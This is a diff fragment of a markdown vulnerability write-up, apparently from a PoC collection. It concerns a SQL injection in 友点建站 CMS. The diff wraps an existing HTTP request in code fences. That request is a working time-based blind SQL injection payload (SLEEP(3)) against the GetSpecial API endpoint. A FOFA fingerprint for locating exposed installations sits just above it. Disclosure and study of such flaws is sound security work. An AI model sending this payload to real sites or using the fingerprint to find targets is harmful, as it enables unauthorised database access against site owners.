@@ -69,6 +69,7 @@ FOFA：app="友点建站-CMS"
 
 POC/EXP：
 
+```http
 GET /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%283%29%29%29A HTTP/1.1
 Host: 127.0.01
 DNT: 1
@@ -79,6 +80,8 @@ Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Cookie: PHPSESSID=bdm4gd5e5vdeog6pjk6md2m3c6
 Connection: close
+```
+
 
 ![image-20240222152242221](./.resource/友点CMSGetSpecialSQL注入/media/image-20240222152242221.png)
 
